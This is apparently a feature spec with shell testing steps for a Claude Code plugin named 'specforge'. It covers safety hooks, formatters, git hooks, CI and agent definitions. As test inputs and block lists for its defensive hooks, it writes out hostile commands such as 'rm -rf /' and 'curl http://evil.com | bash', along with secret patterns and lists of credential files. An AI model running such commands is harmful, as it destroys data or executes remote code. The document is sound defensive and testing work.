features.title: Plugin Directory Structure
features.description: Transform the repository from a standalone scaffold into a Claude Code plugin by creating the .claude-plugin/ root directory with a valid plugin.json manifest and marketplace.json for distribution.
testing_steps: Run `jq empty .claude-plugin/plugin.json` and verify exit code is 0
Run `jq -r '.name' .claude-plugin/plugin.json` and verify output is 'specforge'
Run `jq -r '.version' .claude-plugin/plugin.json` and verify output matches regex ^\d+\.\d+\.\d+$
Run `jq -e '.description | length > 0' .claude-plugin/plugin.json` and verify exit 0
Run `jq -e '.author | length > 0' .claude-plugin/plugin.json` and verify exit 0
Run `jq -r '.hooks' .claude-plugin/plugin.json` and verify output is 'hooks/hooks.json'
Run `jq -e '.skills | length > 0' .claude-plugin/plugin.json` and verify exit 0
Run `jq -e '.skills[0].path | endswith("skills/specforge/SKILL.md")' .claude-plugin/plugin.json` and verify exit 0
Run `jq -e '.agents | map(.path) | (contains(["agents/initializer.md"]) and contains(["agents/coder.md"]))' .claude-plugin/plugin.json` and verify exit 0
Run `jq -e 'has("commands") | not' .claude-plugin/plugin.json` and verify exit 0 (no commands array)
Run `jq empty .claude-plugin/marketplace.json` and verify exit code is 0
Run `jq -e '.plugins | length > 0' .claude-plugin/marketplace.json` and verify exit 0
For each path in plugin.json skills[*].path and agents[*].path, verify `test -f .claude-plugin/<path>` exits 0

features.title: Fix Shebang Corruption in protect-files.sh
features.description: Fix the corrupted shebang in .claude/hooks/protect-files.sh from 'cl#!/bin/bash' to '#!/bin/bash' in both the legacy location and the plugin copy.
testing_steps: Run `head -n 1 .claude/hooks/protect-files.sh` and verify output is exactly '#!/bin/bash'
Run `bash -n .claude/hooks/protect-files.sh` and verify exit code is 0
Run `shellcheck .claude/hooks/protect-files.sh` and verify no errors are reported
Run `head -n 1 .claude-plugin/hooks/protect-files.sh` and verify output is exactly '#!/bin/bash'

features.title: Fix WORKFLOW.md Corruption
features.description: Fix the corrupted first line of .specify/WORKFLOW.md from 'claude# Workflow Documentation' to '# Workflow Documentation'.
testing_steps: Run `head -n 1 .specify/WORKFLOW.md` and verify output is exactly '# Workflow Documentation'
Run `grep -c '^claude#' .specify/WORKFLOW.md` and verify output is '0'
Run markdownlint on .specify/WORKFLOW.md and verify no heading-related errors

features.title: Standardize Hook JSON Key to tool_input
features.description: Update all Claude Code hooks to read tool_input.* instead of input.* from the JSON stdin payload to match the Claude Code protocol.
testing_steps: Run `grep -r '\.input\b' .claude/hooks/` and verify no matches are returned
Run `grep -r '\.tool_input' .claude/hooks/` and verify matches in protect-files.sh, post-edit.sh, validate-bash.sh, validate-pr.sh
Run `echo '{"tool_input":{"file_path":"/tmp/safe.txt"}}' | bash .claude/hooks/protect-files.sh` and verify exit code is 0
Run `echo '{"tool_input":{"file_path":".env"}}' | bash .claude/hooks/protect-files.sh` and verify exit code is non-zero
Run `echo '{"tool_input":{"command":"ls"}}' | bash .claude/hooks/validate-bash.sh` and verify exit code is 0
Run `echo '{"tool_input":{"command":"rm -rf /"}}' | bash .claude/hooks/validate-bash.sh` and verify exit code is non-zero

features.title: Plugin Hooks Manifest
features.description: Create hooks/hooks.json inside .claude-plugin/ declaring all 6 Claude Code hooks with event types, matchers, and script paths using ${CLAUDE_PLUGIN_ROOT}.
testing_steps: Run `jq empty .claude-plugin/hooks/hooks.json` and verify exit code is 0
Run `jq -e '.PreToolUse | length >= 3' .claude-plugin/hooks/hooks.json` and verify exit 0
Verify PreToolUse array contains entries for protect-files.sh (matcher Write|Edit), validate-bash.sh (matcher Bash), validate-pr.sh (matcher Bash)
Run `jq -e '.PostToolUse | length >= 1' .claude-plugin/hooks/hooks.json` and verify exit 0 with post-edit.sh entry
Run `jq -e '.Stop | length >= 2' .claude-plugin/hooks/hooks.json` and verify exit 0 with format-changed.sh first and verify-quality.sh second
Verify every command value in hooks.json contains '${CLAUDE_PLUGIN_ROOT}' prefix
For each script path in hooks.json, replace ${CLAUDE_PLUGIN_ROOT} with .claude-plugin and verify `test -f <path>` exits 0
For each referenced hook script, verify `head -n 1 <script>` outputs '#!/bin/bash'
For each referenced hook script, run `shellcheck <script>` and verify no errors

features.title: CI Pipeline with Plugin Validation
features.description: Update .github/workflows/ci.yml to add a plugin-validation job that checks plugin.json integrity, referenced file paths, hooks.json validity, and SKILL.md existence.
testing_steps: Run `grep -c 'plugin-validation' .github/workflows/ci.yml` and verify output is >= 1
Verify the plugin-validation job runs `jq empty .claude-plugin/plugin.json`
Verify the plugin-validation job validates all file paths in plugin.json resolve to existing files
Verify the plugin-validation job validates hooks/hooks.json is valid JSON and referenced scripts exist
Run `grep -c 'actions/checkout@v4' .github/workflows/ci.yml` and verify output is '0'
Run `grep -c 'actions/checkout@v4' ci/github/workflows/ci.yml` and verify output is '0'
Verify the summary job needs array includes 'plugin-validation'
Verify the workflow has a top-level permissions block

features.title: Tag-Triggered Release Workflow
features.description: Create .github/workflows/release.yml triggered by v* tags that validates tag version matches plugin.json version, runs CI checks, creates a GitHub release, and attaches artifact attestation.
testing_steps: Verify `test -f .github/workflows/release.yml` exits 0
Run `yq eval '.' .github/workflows/release.yml > /dev/null 2>&1` and verify exit 0 (valid YAML)
Verify the workflow triggers on push tags matching 'v*'
Verify the workflow contains a step that extracts the version from the git tag and compares it to plugin.json version
Verify the workflow fails if tag version and plugin.json version do not match
Verify the workflow runs shellcheck, markdownlint, prettier, and plugin-validation steps
Verify the workflow creates a GitHub release using gh release create or actions/create-release
Verify the workflow has permissions including contents: write, id-token: write, attestations: write
Verify the workflow references actions/attest-build-provenance for artifact attestation

features.title: Settings.json Safety Block
features.description: Add defense-in-depth blockedCommands and protectedFiles to the plugin configuration as static declarations enforced by Claude Code even if hook scripts fail.
testing_steps: Identify the plugin configuration file (plugin.json, settings.json, or hooks.json) that contains blockedCommands
Verify blockedCommands array contains at minimum: 'rm -rf /', 'rm -rf ~', 'git push --force', 'git reset --hard', 'git clean -fd', 'chmod 777', 'mkfs'
Verify protectedFiles array contains at minimum: '.env', '.env.*', '*.pem', '*.key', '*.crt', 'id_rsa', 'id_ed25519', 'credentials.json'
Run `jq empty <config-file>` and verify exit code is 0 (valid JSON)

features.title: Shared Formatter Dispatch Library
features.description: Create a shared shell library under .claude-plugin/ that contains format detection and execution logic used by both post-edit.sh and format-changed.sh, eliminating duplication.
testing_steps: Verify file `_formatter-dispatch.sh` exists under `.claude-plugin/hooks/` or `.claude-plugin/scripts/`
Run `bash -n <file>` and verify exit code is 0 (valid bash syntax)
Run `shellcheck <file>` and verify no errors are reported
Verify the file defines a `format_file()` function using `grep -c 'format_file()' <file>` returning >= 1
Verify the file defines a `find_prettier_root()` function using `grep -c 'find_prettier_root()' <file>` returning >= 1

Verify extension-to-formatter mapping covers ts/tsx/js/jsx/json/css/html/md/yaml/yml (Prettier), py (ruff > black > autopep8), rs (rustfmt), sh (shfmt), go (gofmt), rb (rubocop), java/kt (google-java-format)
Verify both post-edit.sh and format-changed.sh source this file using `grep -E '(source|\.).*_formatter-dispatch\.sh' .claude-plugin/hooks/post-edit.sh`
Verify both post-edit.sh and format-changed.sh source this file using `grep -E '(source|\.).*_formatter-dispatch\.sh' .claude-plugin/hooks/format-changed.sh`
Verify no formatter dispatch logic is duplicated between post-edit.sh and format-changed.sh

features.title: protect-files.sh PreToolUse Hook
features.description: PreToolUse hook that fires on Write and Edit tool invocations, blocking modification of sensitive files (environment files, SSH keys, certificates, credentials, cloud configs, lock files) with an allowlist for .example and .sample suffixed files. Uses exit code 2 for blocks.
testing_steps: Run `echo '{"tool_input":{"file_path":".env"}}' | bash .claude/hooks/protect-files.sh` and verify exit code is 2 and stderr contains 'BLOCKED: Environment file'
Run `echo '{"tool_input":{"file_path":".env.local"}}' | bash .claude/hooks/protect-files.sh` and verify exit code is 2 and stderr contains 'BLOCKED: Environment file'
Run `echo '{"tool_input":{"file_path":".env.example"}}' | bash .claude/hooks/protect-files.sh` and verify exit code is 0 (allowlist)
Run `echo '{"tool_input":{"file_path":".env.sample"}}' | bash .claude/hooks/protect-files.sh` and verify exit code is 0 (allowlist)
Run `echo '{"tool_input":{"file_path":"config/id_rsa"}}' | bash .claude/hooks/protect-files.sh` and verify exit code is 2 and stderr contains 'BLOCKED: SSH key'
Run `echo '{"tool_input":{"file_path":"certs/server.pem"}}' | bash .claude/hooks/protect-files.sh` and verify exit code is 2 and stderr contains 'BLOCKED: Certificate'
Run `echo '{"tool_input":{"file_path":"package-lock.json"}}' | bash .claude/hooks/protect-files.sh` and verify exit code is 2 and stderr contains 'BLOCKED: Lock file'
Run `echo '{"tool_input":{"file_path":"src/.aws/config"}}' | bash .claude/hooks/protect-files.sh` and verify exit code is 2 and stderr contains 'BLOCKED: File in sensitive directory'
Run `echo '{"tool_input":{"file_path":"src/main.ts"}}' | bash .claude/hooks/protect-files.sh` and verify exit code is 0
Run `echo '{"tool_input":{"file_path":""}}' | bash .claude/hooks/protect-files.sh` and verify exit code is 0 (fail open on empty path)
Run `echo 'not-json' | bash .claude/hooks/protect-files.sh` and verify exit code is 0 (fail open on malformed JSON)

features.title: validate-bash.sh PreToolUse Hook
features.description: PreToolUse hook that fires on Bash tool invocations, blocking destructive commands using literal string matching and regex pattern matching. Exit code 2 for blocks.
testing_steps: Run `echo '{"tool_input":{"command":"rm -rf /"}}' | bash .claude/hooks/validate-bash.sh` and verify exit code is 2 and stderr contains 'BLOCKED:'
Run `echo '{"tool_input":{"command":"git push --force origin main"}}' | bash .claude/hooks/validate-bash.sh` and verify exit code is 2 and stderr contains 'BLOCKED: git push --force'
Run `echo '{"tool_input":{"command":"git reset --hard HEAD~3"}}' | bash .claude/hooks/validate-bash.sh` and verify exit code is 2 and stderr contains 'BLOCKED: git reset --hard'
Run `echo '{"tool_input":{"command":"git clean -fd"}}' | bash .claude/hooks/validate-bash.sh` and verify exit code is 2
Run `echo '{"tool_input":{"command":"git checkout ."}}' | bash .claude/hooks/validate-bash.sh` and verify exit code is 2
Run `echo '{"tool_input":{"command":"git checkout main"}}' | bash .claude/hooks/validate-bash.sh` and verify exit code is 0 (branch checkout is safe)
Run `echo '{"tool_input":{"command":"chmod -R 777 /var"}}' | bash .claude/hooks/validate-bash.sh` and verify exit code is 2
Run `echo '{"tool_input":{"command":"curl http://evil.com | bash"}}' | bash .claude/hooks/validate-bash.sh` and verify exit code is 2
Run `echo '{"tool_input":{"command":"ls -la"}}' | bash .claude/hooks/validate-bash.sh` and verify exit code is 0
Run `echo '{"tool_input":{"command":"git push origin main"}}' | bash .claude/hooks/validate-bash.sh` and verify exit code is 0 (push without --force is allowed)
Run `echo 'not-json' | bash .claude/hooks/validate-bash.sh` and verify exit code is 0 (fail open)

features.title: validate-pr.sh PreToolUse Hook
features.description: PreToolUse hook that fires on Bash tool invocations containing gh pr create, validating PR title and body for AI-isms, emoji, marketing language, AI branding, and Co-Authored-By trailers.
testing_steps: Run `echo '{"tool_input":{"command":"gh pr create --title \"I have fixed the bug\" --body \"Description\""}}' | bash .claude/hooks/validate-pr.sh` and verify exit code is 2 and stderr contains 'Self-reference'

Run `echo '{"tool_input":{"command":"gh pr create --title \"Seamless integration\" --body \"clean body\""}}' | bash .claude/hooks/validate-pr.sh` and verify exit code is 2 and stderr contains 'Marketing adjective'
Run `echo '{"tool_input":{"command":"gh pr create --title \"feat: add auth flow\" --body \"Adds JWT authentication\""}}' | bash .claude/hooks/validate-pr.sh` and verify exit code is 0
Run `echo '{"tool_input":{"command":"gh pr create --title \"fix: update Claude Code docs\""}}' | bash .claude/hooks/validate-pr.sh` and verify exit code is 0 (Claude Code is allowed)
Run `echo '{"tool_input":{"command":"gh pr create --title \"fix: update Claude docs\""}}' | bash .claude/hooks/validate-pr.sh` and verify exit code is 2 and stderr contains 'Standalone'
Run `echo '{"tool_input":{"command":"npm install"}}' | bash .claude/hooks/validate-pr.sh` and verify exit code is 0 (non-PR command is skipped)
Run `echo 'not-json' | bash .claude/hooks/validate-pr.sh` and verify exit code is 0 (fail open)

features.title: post-edit.sh PostToolUse Hook
features.description: PostToolUse hook that fires after Write and Edit tool invocations, auto-formatting the edited file based on its extension using the appropriate language formatter via the shared dispatch library. All formatting is best-effort.
testing_steps: Verify `head -n 1 .claude/hooks/post-edit.sh` outputs '#!/bin/bash'
Run `bash -n .claude/hooks/post-edit.sh` and verify exit code is 0
Run `echo '{"tool_input":{"file_path":"/nonexistent/file.ts"}}' | bash .claude/hooks/post-edit.sh` and verify exit code is 0 (file does not exist, fail open)
Run `echo '{"tool_input":{"file_path":""}}' | bash .claude/hooks/post-edit.sh` and verify exit code is 0 (empty path, fail open)
Run `echo 'not-json' | bash .claude/hooks/post-edit.sh` and verify exit code is 0 (malformed JSON, fail open)
Verify post-edit.sh sources the shared formatter dispatch library using `grep -E '(source|\.).*_formatter-dispatch' .claude/hooks/post-edit.sh`
Run `echo '{"tool_input":{"file_path":"test.xyz"}}' | bash .claude/hooks/post-edit.sh` and verify exit code is 0 (unrecognized extension, silent skip)

features.title: format-changed.sh Stop Hook (Batch Formatter)
features.description: Stop hook that discovers all files changed in the git working tree and batch-formats them using language-appropriate formatters via the shared dispatch library. Runs before verify-quality.sh. Checks stop_hook_active to prevent infinite recursion.
testing_steps: Verify `head -n 1 .claude/hooks/format-changed.sh` outputs '#!/bin/bash'
Run `bash -n .claude/hooks/format-changed.sh` and verify exit code is 0
Run `echo '{"stop_hook_active": true}' | bash .claude/hooks/format-changed.sh` and verify exit code is 0 (recursion guard)
Verify format-changed.sh sources the shared formatter dispatch library using `grep -E '(source|\.).*_formatter-dispatch' .claude/hooks/format-changed.sh`
Verify the script discovers changed files via `grep -c 'git diff --name-only' .claude/hooks/format-changed.sh` returning >= 1
Verify the script excludes deleted files by checking for diff-filter or file existence check
Run `echo '{}' | bash .claude/hooks/format-changed.sh` in a git repo with no modified files and verify exit code is 0

features.title: verify-quality.sh Stop Hook
features.description: Stop hook that runs quality checks (lint, type check, tests) before allowing Claude Code to stop. Auto-detects project types from config files. Uses exit code 2 to block if required checks fail. Checks stop_hook_active to prevent infinite recursion.
testing_steps: Verify `head -n 1 .claude/hooks/verify-quality.sh` outputs '#!/bin/bash'
Run `bash -n .claude/hooks/verify-quality.sh` and verify exit code is 0
Run `echo '{"stop_hook_active": true}' | bash .claude/hooks/verify-quality.sh` and verify exit code is 0 (recursion guard)
Verify the script uses `$CLAUDE_PROJECT_DIR` or `git rev-parse --show-toplevel` for project root discovery
Verify the script scans one level deep for subprojects using a glob pattern on `$PROJECT_ROOT/*/`
Verify bash arithmetic uses `VAR=$((VAR + 1))` not `((VAR++))` by checking `grep -c '((.*++' .claude/hooks/verify-quality.sh` returns 0
Verify the script defines both `run_check` and `run_optional_check` functions
Run `echo '{}' | bash .claude/hooks/verify-quality.sh` in a directory with no recognized project type and verify exit code is 0

features.title: /specforge constitution Sub-Command
features.description: Interactive skill sub-command that guides the user through defining immutable project principles, reading the constitution template, presenting each section one at a time, and assembling responses into .specify/memory/constitution.md.
testing_steps: Verify `test -f .claude-plugin/skills/specforge/SKILL.md` exits 0
Verify `grep -c '### /specforge constitution' .claude-plugin/skills/specforge/SKILL.md` returns >= 1
Verify the constitution section references a template path containing 'constitution-template.md'
Verify the constitution section references '.specify/memory/constitution.md' as the output artifact
Verify the template file exists at `.claude-plugin/templates/constitution-template.md` or `.specify/templates/constitution-template.md`
Verify the template contains sections for: Project Identity, Non-Negotiable Principles, Quality Standards, Architectural Constraints, Security Requirements, Out of Scope

features.title: /specforge spec Sub-Command
features.description: Interactive skill sub-command that documents features and acceptance criteria by reading the constitution, asking the user to describe features, grouping them into categories, and writing .specify/specs/spec.md.
testing_steps: Verify `grep -c '### /specforge spec' .claude-plugin/skills/specforge/SKILL.md` returns >= 1
Verify the spec section references 'constitution.md' as a prerequisite read
Verify the spec section references '.specify/specs/spec.md' as the output artifact
Verify the spec section mentions feature ID format with category prefix + sequential number (e.g., INFRA-001, FUNC-001)
Verify the spec section references the spec-template.md as a template source

features.title: /specforge clarify Sub-Command
features.description: Interactive skill sub-command that surfaces ambiguities, contradictions, missing error handling, undefined edge cases, and unstated assumptions in the spec, presenting each as a numbered question with suggested resolutions.
testing_steps: Verify `grep -c '### /specforge clarify' .claude-plugin/skills/specforge/SKILL.md` returns >= 1
Verify the clarify section references both 'constitution.md' and 'spec.md' as prerequisite reads
Verify the clarify section mentions issue types: ambiguous requirements, missing error handling, undefined edge cases, contradictions
Verify the clarify section instructs updating spec.md with resolved decisions

features.title: /specforge plan Sub-Command
features.description: Interactive skill sub-command that makes and records technical architecture decisions by reading constitution and spec, proposing decisions with recommendations and alternatives, and writing .specify/specs/plan.md.
testing_steps: Verify `grep -c '### /specforge plan' .claude-plugin/skills/specforge/SKILL.md` returns >= 1
Verify the plan section references 'constitution.md' and 'spec.md' as prerequisite reads
Verify the plan section references '.specify/specs/plan.md' as the output artifact
Verify the plan section mentions decision areas such as project structure, tech stack, testing strategy
Verify the plan template exists at `.claude-plugin/templates/plan-template.md` or `.specify/templates/plan-template.md`

features.title: /specforge features Sub-Command
features.description: Sub-command that generates feature_list.json from the spec and plan with kebab-case IDs, categories, testing steps, dependency references, and schema validation including cycle detection.
testing_steps: Verify `grep -c '### /specforge features' .claude-plugin/skills/specforge/SKILL.md` returns >= 1
Verify the features section references 'constitution.md', 'spec.md', and 'plan.md' as prerequisite reads
Verify the features section references 'feature_list.json' as the output artifact
Verify the features section mentions schema validation against feature-list-schema.json
Verify the features section mentions dependency cycle detection
Verify the features section mentions that all passes fields must be false initially
Verify the features section requires minimum 3 testing steps per feature and 20% with 10+ steps

features.title: /specforge analyze Sub-Command
features.description: Scores spec artifacts for autonomous-readiness on a 0-100 scale across 5 weighted dimensions: Completeness (25%), Testability (25%), Dependency Quality (15%), Ambiguity (20%), Autonomous Feasibility (15%).
testing_steps: Verify `grep -c '### /specforge analyze' .claude-plugin/skills/specforge/SKILL.md` returns >= 1
Verify the analyze section lists five dimensions: Completeness, Testability, Dependency Quality, Ambiguity, Autonomous Feasibility
Verify the analyze section references 'feature_list.json' as an input artifact
Verify the analyze section specifies weights: Completeness 25%, Testability 25%, Dependency Quality 15%, Ambiguity 20%, Autonomous Feasibility 15%
Verify the analyze section defines READY threshold at >= 80 and NEEDS WORK at < 80
Verify the analyze section mentions remediation steps for dimensions below 70

features.title: /specforge setup Sub-Command
features.description: Generates a platform-specific project setup checklist reading the plan for CI platform (defaults to GitHub), outputting numbered steps with gh CLI commands for automated execution.
testing_steps: Verify `grep -c '### /specforge setup' .claude-plugin/skills/specforge/SKILL.md` returns >= 1
Verify the setup section references GitHub as the default CI platform
Verify the setup section references 'plan.md' as an optional input with fallback to GitHub defaults
Verify the setup section mentions branch protection, CODEOWNERS, Dependabot, secret scanning, and PR templates
Verify the setup section mentions using gh api commands for branch protection configuration

features.title: /specforge init Sub-Command (Scaffold Projection)
features.description: Sub-command that projects the scaffold layer from the plugin into a host project, copying CI workflows, git hooks, templates, CLAUDE.md template, and quality principles. Creates .specforge-version to track installed version.
testing_steps: Verify `grep -c '### /specforge init' .claude-plugin/skills/specforge/SKILL.md` returns >= 1
Verify the init section lists all scaffold files to be projected: .specify/templates/, scripts/hooks/, ci/principles/, ci/github/, prompts/, .prettierrc.json, .prettierignore
Verify the init section references .specforge-version as the version tracking file
Verify the init section mentions skipping existing files with a 'skipping' message
Verify the init section mentions running install-hooks.sh after copying
Verify the init section mentions creating CLAUDE.md from CLAUDE.md.template when CLAUDE.md does not exist
Verify the init section mentions git init -b main for non-git directories

features.title: /specforge upgrade Sub-Command
features.description: Sub-command that updates scaffold files using three-tier file categorization: overwrite (foundation-owned), review (commonly customized, shown as diffs), and skip (project-specific). Reads .specforge-version to determine changes between versions.
testing_steps: Verify `grep -c '### /specforge upgrade' .claude-plugin/skills/specforge/SKILL.md` returns >= 1
Verify the upgrade section describes three tiers: overwrite, review, skip
Verify the upgrade section references .specforge-version for version comparison
Verify `test -f .claude-plugin/upgrade-tiers.json` exits 0
Run `jq empty .claude-plugin/upgrade-tiers.json` and verify exit code is 0 (valid JSON)
Verify upgrade-tiers.json lists files in overwrite tier including ci/principles/*.md, scripts/hooks/pre-commit, scripts/hooks/commit-msg
Verify upgrade-tiers.json lists files in skip tier including CLAUDE.md, .specify/memory/constitution.md, feature_list.json

features.title: Initializer Agent Definition
features.description: Agent definition file at .claude-plugin/agents/initializer.md for the first session of the two-agent autonomous execution pattern. Reads spec artifacts, validates feature_list.json, creates init.sh, and initializes project structure.
testing_steps: Verify `test -f .claude-plugin/agents/initializer.md` exits 0
Verify the file contains references to 'constitution.md', 'spec.md', 'plan.md', and 'feature_list.json'
Verify the file contains a prerequisite check instructing the agent to verify spec artifacts exist
Verify the file mentions creating init.sh as an output
Verify the file mentions creating claude-progress.txt as a session summary
Verify the file mentions the commit message 'chore: initialize project structure'
Verify the file explicitly states not to implement features (only scaffolding)

features.title: Coder Agent Definition
features.description: Agent definition file at .claude-plugin/agents/coder.md for the 10-step coding loop: orient, start servers, verify existing, select feature, implement, test, update tracking, commit, document, clean shutdown.
testing_steps: Verify `test -f .claude-plugin/agents/coder.md` exits 0
Verify the file contains the 10-step loop with numbered steps by checking `grep -c 'Step [0-9]' .claude-plugin/agents/coder.md` returns >= 10
Verify the file references 'feature_list.json' for feature selection and tracking
Verify the file references 'claude-progress.txt' for session documentation
Verify the file mentions selecting the first feature where passes is false and all dependencies have passes true
Verify the file mentions using 'git add <specific-files>' (not 'git add .')
Verify the file mentions conventional commit format with no emoji, no AI-isms, no Co-Authored-By

features.title: Pre-commit Git Hook
features.description: Git hook installed to .git/hooks/pre-commit that discovers staged files, checks for forbidden files, scans staged content for secret patterns, and runs language-appropriate linters.
testing_steps: Verify `test -f scripts/hooks/pre-commit` exits 0
Run `bash -n scripts/hooks/pre-commit` and verify exit code is 0
Verify the script checks for forbidden files (.env) using `grep -c '\.env' scripts/hooks/pre-commit` returning >= 1
Verify the script checks for AWS key patterns (AKIA) using `grep -c 'AKIA' scripts/hooks/pre-commit` returning >= 1
Verify the script checks for GitHub token patterns (ghp_) using `grep -c 'ghp_' scripts/hooks/pre-commit` returning >= 1
Verify the script uses --diff-filter=ACM to skip deleted files
Verify the script checks staged content via `git show :<file>` not the working tree copy
Verify the script handles Go files with gofmt auto-format and re-stage
Verify the script skips generated files like protobuf outputs

features.title: Commit-msg Git Hook
features.description: Git hook installed to .git/hooks/commit-msg that validates commit message format: conventional commits, blocks AI-isms, emoji, marketing adjectives, AI branding, standalone Claude, and Co-Authored-By trailers.
testing_steps: Verify `test -f scripts/hooks/commit-msg` exits 0
Run `bash -n scripts/hooks/commit-msg` and verify exit code is 0
Create temp file with 'feat: add login', run `bash scripts/hooks/commit-msg <tempfile>`, verify exit 0
Create temp file with 'added new feature', run the hook, verify exit 1 with stderr containing 'conventional commit'
Create temp file with 'feat: I have added login', run the hook, verify exit 1 with stderr containing 'Self-referential'
Create temp file with 'feat: seamless integration', run the hook, verify exit 1 with stderr containing 'Marketing adjective'
Create temp file with empty content, run the hook, verify exit 1 with stderr containing 'Empty commit message'
Create temp file with 'fix: update Claude Code integration', run the hook, verify exit 0 (Claude Code is allowed)
Create temp file with 'fix: update Claude integration', run the hook, verify exit 1 with stderr containing 'Standalone'
Create temp file with message containing 'Co-Authored-By: Bot <bot@example.com>', run the hook, verify exit 1

features.title: install-hooks.sh Script
features.description: Shell script that copies git hooks from scripts/hooks/ to .git/hooks/ and makes all Claude Code hooks (.claude/hooks/*.sh) executable. Idempotent and safe to run multiple times.
testing_steps: Verify `test -f scripts/install-hooks.sh` exits 0
Verify `test -x scripts/install-hooks.sh` exits 0 (script is executable)
Run `bash -n scripts/install-hooks.sh` and verify exit code is 0
Run the script in a git repository and verify `.git/hooks/pre-commit` exists and is executable
Run the script in a git repository and verify `.git/hooks/commit-msg` exists and is executable
Verify stdout contains 'Installed: pre-commit' and 'Installed: commit-msg'
Verify all .sh files in .claude/hooks/ have execute permission after running the script

features.title: Plugin Structure Validation Script
features.description: Shell script (scripts/validate-plugin.sh) that validates plugin directory structure, manifest integrity, referenced file paths, hooks.json validity, and version format.
testing_steps: Verify `test -f scripts/validate-plugin.sh` exits 0
Verify `test -x scripts/validate-plugin.sh` exits 0
Run `bash scripts/validate-plugin.sh` and verify it checks .claude-plugin/plugin.json is valid JSON
Verify the script checks every file path in skills and agents arrays resolves to an existing file
Verify the script checks .claude-plugin/hooks/hooks.json is valid JSON
Verify the script checks every command path in hooks.json resolves to an existing .sh file
Verify the script checks .claude-plugin/marketplace.json is valid JSON
Verify the script checks version field matches semver regex
Verify each validation prints 'PASS: <name>' or 'FAIL: <name>'
Verify a final summary line reads 'X of Y validations passed'
Run the script and verify exit code is 0 when all validations pass

features.title: Hook Smoke Tests
features.description: Test script (scripts/test-hooks.sh) that smoke-tests all 6 Claude Code hooks by piping JSON payloads to stdin and asserting exit codes and stderr content.
testing_steps: Verify `test -f scripts/test-hooks.sh` exits 0
Verify `test -x scripts/test-hooks.sh` exits 0
Run `bash scripts/test-hooks.sh` and verify it tests protect-files.sh with >= 4 cases (allowed file exit 0, .env exit 2, id_rsa exit 2, .env.example exit 0)
Verify the script tests validate-bash.sh with >= 4 cases (ls exit 0, rm -rf / exit 2, git push --force exit 2, fork bomb exit 2)
Verify the script tests validate-pr.sh with >= 3 cases (clean PR exit 0, PR with AI-ism exit 2, non-PR exit 0)
Verify the script tests post-edit.sh with >= 2 cases (valid path exit 0, empty path exit 0)
Verify the script tests format-changed.sh with stop_hook_active true (exit 0)
Verify the script tests verify-quality.sh with stop_hook_active true (exit 0)
Verify each test prints 'PASS: <name>' or 'FAIL: <name>'
Verify the final line matches 'X of Y tests passed'
Verify the script exits 0 if all tests pass

features.title: Scaffold Projection End-to-End Test
features.description: Test script (scripts/test-scaffold.sh) that runs the init/scaffold logic against a fresh temporary directory and validates all expected files exist, hooks are executable, and .specforge-version is correct.
testing_steps: Verify `test -f scripts/test-scaffold.sh` exits 0
Verify `test -x scripts/test-scaffold.sh` exits 0
Verify the script creates a temporary directory with mktemp -d
Verify the script uses trap to clean up the temp directory on exit

Run the script and verify it checks for: .specify/WORKFLOW.md, .specify/templates/constitution-template.md, scripts/hooks/pre-commit, scripts/hooks/commit-msg, ci/principles/commit-gate.md, prompts/initializer-prompt.md, .prettierrc.json
Verify the script checks CLAUDE.md exists in the temp directory
Verify the script checks .specforge-version content matches semver regex
Verify the script checks scripts/hooks/pre-commit is executable
Verify the script checks the temp directory is a git repo via `git rev-parse --is-inside-work-tree`
Verify each check prints 'PASS:' or 'FAIL:' and a final summary line

features.title: Upgrade Three-Tier Test
features.description: Test script (scripts/test-upgrade.sh) that validates the upgrade command respects three-tier file classification by setting up a scaffolded project, modifying files in each tier, running upgrade, and asserting correct behavior.
testing_steps: Verify `test -f scripts/test-upgrade.sh` exits 0
Verify `test -x scripts/test-upgrade.sh` exits 0
Verify the script creates a scaffolded temp directory (runs init first)
Verify the script appends 'CANARY_OVERWRITE' to a file in the overwrite tier
Verify the script appends 'CANARY_SKIP' to a file in the skip tier
Verify the script writes '0.0.1' to .specforge-version to simulate old version
Verify the script runs upgrade logic and checks CANARY_OVERWRITE is removed (overwrite tier works)
Verify the script checks CANARY_SKIP is preserved (skip tier works)
Verify the script checks .specforge-version contains the current plugin version after upgrade
Verify the script uses trap to clean up on exit

features.title: Commit-msg Hook Validation Tests
features.description: Test script (scripts/test-commit-msg.sh) that exercises the commit-msg hook against a comprehensive set of valid and invalid commit messages.
testing_steps: Verify `test -f scripts/test-commit-msg.sh` exits 0
Verify `test -x scripts/test-commit-msg.sh` exits 0
Run the script and verify it tests passing messages: 'feat: add login', 'fix(auth): resolve token expiry', 'docs: update README', 'fix: update Claude Code docs'

Verify the script tests failing messages: 'added login' (no prefix), 'feat: I have added login' (AI-ism), 'feat: seamless integration' (marketing), empty message, 'fix: update Claude integration' (standalone Claude), message with Co-Authored-By (error)
Verify the script tests warning-only messages: subject at 73 chars (passes with warning), body with WIP marker (passes with warning)
Verify each test creates a temp file, passes it as $1 to the hook, and checks exit code
Verify passing messages exit 0, failing messages exit 1, warning messages exit 0
Verify each test prints 'PASS:' or 'FAIL:' and a final summary line
Verify the script exits 0 if all tests pass

features.title: JSON Key Standardization Verification
features.description: Test script (scripts/test-json-keys.sh) that scans all hook scripts for the old input.* JSON key pattern and verifies the tool_input.* standardization is complete.
testing_steps: Verify `test -f scripts/test-json-keys.sh` exits 0
Verify `test -x scripts/test-json-keys.sh` exits 0
Verify the script scans every .sh file under .claude/hooks/ and .claude-plugin/hooks/ (both locations)
Verify the script fails (exit 1) if any file contains '.input' as a jq accessor
Verify the script passes (exit 0) if all hook files use '.tool_input' as the jq accessor
Verify the script prints filename and matching line for each violation found
Run the script after standardization is complete and verify exit code is 0 with message about no legacy keys found
